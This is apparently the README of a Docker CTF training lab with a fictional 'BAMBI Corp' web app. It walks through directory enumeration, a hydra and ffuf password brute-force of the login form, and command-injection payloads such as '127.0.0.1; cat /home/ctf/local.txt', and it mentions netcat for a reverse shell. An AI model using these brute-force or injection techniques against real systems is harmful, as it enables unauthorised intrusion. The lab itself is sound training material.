# Tokha Attack Path Lab

A realistic, self-contained web exploitation lab that simulates a complete attack path: directory enumeration, credential brute‑forcing, and command injection. Designed for CTF learners and security training.

## 🚀 Quick Start

### Prerequisites
- **Docker** and **Docker Compose** (recommended) OR
- **Apache** and **PHP** for local deployment

### Quick Deployment (Docker)
```bash
# Clone the repository
git clone https://github.com/<your-username>/web-challenge-one.git
cd web-challenge-one

# Build and start the lab
docker compose up --build

# Access at: http://localhost:8080/bambi/
```

## 📋 Overview

The lab presents a fictional company "BAMBI Corp" with a vulnerable web application. Your goal is to discover hidden directories, crack weak credentials, and exploit a command injection vulnerability to retrieve the flag.

**Learning Objectives:**
- Web directory enumeration using robots.txt and brute‑forcing tools
- Password brute‑forcing against a web login form
- Exploiting command injection vulnerabilities
- Understanding real‑world attack chains

## 🏗️ Lab Architecture

```
/var/www/html/bambi/
├── index.php              # Main page with enumeration hint
├── robots.txt             # Hints at /developer/ directory
├── developer/
│   └── login.php         # Vulnerable login form (no rate limiting)
└── admin/
    └── panel.php         # Command injection panel (requires auth)

/home/ctf/
├── local.txt             # Flag file (BAMBI{you_found_the_local_flag})
└── wordlist.txt          # Custom password list for brute‑forcing
```

## 🚀 Deployment Options

### Docker (Recommended)

**Prerequisites:** Docker and Docker Compose v2 installed.

```bash
# 1. Clone or download the lab
git clone https://github.com/<your-username>/web-challenge-one.git
cd web-challenge-one

# 2. Build and start the container (first build may take 5-10 minutes)
docker compose up --build -d

# 3. Check if the container is running
docker ps

# 4. Access the lab
#    Main page: http://localhost:8080/bambi/
#    Robots.txt: http://localhost:8080/bambi/robots.txt

# 5. Stop the lab when done
docker compose down
```

**Port Mapping:** Container port 80 is mapped to host port 8080. If port 8080 is occupied, modify `docker-compose.yml`.

**Notes:** 
- First build downloads Ubuntu 22.04 and installs Apache/PHP (~138MB)
- Container runs as a detached service (`-d` flag)
- Logs: `docker compose logs`
- Shell access: `docker compose exec bambi-lab bash`

### Local Apache/PHP Setup

**Prerequisites:** Apache2, PHP, and sudo privileges.

```bash
# 1. Clone or download the lab
git clone https://github.com/<your-username>/web-challenge-one.git
cd web-challenge-one

# 2. Run the automated setup script
sudo ./scripts/setup-local.sh

# 3. The script will:
#    - Install Apache and PHP (if not already installed)
#    - Copy web files to /var/www/html/bambi/
#    - Create flag file at /home/ctf/local.txt
#    - Set appropriate permissions

# 4. Access the lab
#    Main page: http://localhost/bambi/
#    Robots.txt: http://localhost/bambi/robots.txt

# 5. Verify Apache is running
systemctl status apache2

# 6. Cleanup when done
sudo ./scripts/teardown-local.sh
```

**Manual Setup Alternative:**
```bash
# Copy web files manually
sudo cp -r bambi /var/www/html/
sudo mkdir -p /home/ctf
echo "BAMBI{you_found_the_local_flag}" | sudo tee /home/ctf/local.txt
sudo chown -R www-data:www-data /var/www/html/bambi /home/ctf/local.txt
sudo chmod 600 /home/ctf/local.txt
```

## 🎯 Challenge Details

### Difficulty: Easy-Medium
**Estimated Time:** 30-60 minutes  
**Skills Required:** Basic web enumeration, tool usage (dirb/gobuster, hydra/ffuf), command injection

### Attack Path

1. **Enumeration**  
   Discover hidden directories using `robots.txt` or directory brute‑forcing tools.  
   **Hint:** Check `robots.txt` for disallowed paths.

2. **Credential Brute‑Force**  
   Find the login page and crack the developer password using the provided wordlist.  
   **Hint:** Username is known (`dev`), password is in `wordlist.txt`.

3. **Command Injection**  
   After authentication, exploit the ping utility to execute arbitrary commands.  
   **Hint:** The ping parameter is vulnerable to command injection via `;`, `|`, or `&&`.

4. **Flag Capture**  
   Read the flag file located at `/home/ctf/local.txt`.

### Credentials & Flags

- **Username:** `dev`
- **Password:** `devpass` (in wordlist)
- **Flag:** `BAMBI{you_found_the_local_flag}`

## 🔍 Detailed Attack Walkthrough

### Step 1: Discovery
```bash
# Directory enumeration
gobuster dir -u http://localhost:8080/bambi/ -w /usr/share/wordlists/dirb/common.txt

# Or check robots.txt
curl http://localhost:8080/bambi/robots.txt
```

### Step 2: Brute‑Force Login
```bash
# Using hydra
hydra -l dev -P /home/ctf/wordlist.txt http-post-form "/bambi/developer/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Using ffuf
ffuf -w /home/ctf/wordlist.txt -X POST -d "username=dev&password=FUZZ" -u http://localhost:8080/bambi/developer/login.php -fr "Invalid credentials"
```

### Step 3: Command Injection
After logging in with `dev:devpass`, navigate to the admin panel.

**Payload Examples:**
- `127.0.0.1; cat /home/ctf/local.txt`
- `127.0.0.1 | ls -la /home/ctf`
- `127.0.0.1 && whoami`

### Step 4: Capture Flag
Execute the payload in the ping form to display the flag contents.

## 🛠️ Tools & Resources

**Recommended Tools:**
- `gobuster` / `dirb` – directory enumeration
- `hydra` / `ffuf` – password brute‑forcing
- `curl` / browser – manual testing
- `netcat` – optional reverse shell

**Wordlist:** `resources/wordlist.txt` (also copied to `/home/ctf/wordlist.txt` in the container)

## 🧪 Testing & Verification

### Automated Test
Run the included test script to verify basic functionality:
```bash
cd web-challenge-one
./scripts/test-lab.sh
```

### Manual Verification
1. Access `http://localhost:8080/bambi/` – should show "BAMBI Corp Intranet"
2. Check `robots.txt` – should reveal `/developer/`
3. Try login with wrong credentials – should show "Invalid credentials!"
4. Login with `dev:devpass` – should redirect to admin panel
5. Test command injection with `127.0.0.1; whoami` – should show `www-data`

## ⚠️ Security Notes

- This lab contains intentional vulnerabilities for educational purposes
- Do not deploy on internet‑facing servers
- Use in isolated environments (Docker recommended)
- No sensitive data is stored or exposed

## 📁 File Structure

```
tokha-lab/
├── bambi/                    # Web application files
│   ├── index.php            # Main page with enumeration hint
│   ├── robots.txt           # Hints at /developer/ directory
│   ├── developer/login.php  # Vulnerable login form
│   └── admin/panel.php      # Command injection panel
├── resources/               # Supporting files
│   ├── local.txt           # Flag content (BAMBI{you_found_the_local_flag})
│   └── wordlist.txt        # Password list for brute‑forcing
├── scripts/                 # Automation scripts
│   ├── setup-local.sh      # Local Apache/PHP setup
│   ├── teardown-local.sh   # Local cleanup
│   └── test-lab.sh         # Functional test (PHP built‑in server)
├── Dockerfile              # Docker build configuration
├── docker-compose.yml      # Docker compose configuration
├── .gitignore              # Git ignore file
└── README.md               # This documentation
```

## 🐛 Troubleshooting

**Docker issues:**
- Ensure Docker and Docker Compose are installed and running
- Check port 8080 is not already in use (`sudo lsof -i :8080`)
- Run `docker compose logs` for error details
- If build fails, check internet connection and Docker daemon

**Apache/PHP issues:**
- Verify Apache service is running: `systemctl status apache2`
- Check PHP module is enabled: `php -v`
- Ensure `/var/www/html/bambi` has correct permissions

**Lab not accessible:**
- Confirm lab is running on correct port
- Check firewall settings
- Verify files are in the correct location

## 📄 License & Acknowledgments

This lab is based on the "Tokha Attack Path" blueprint for CTF challenge design.  
Educational use only. Not for production deployment.

---

**Happy Hacking!** 🎯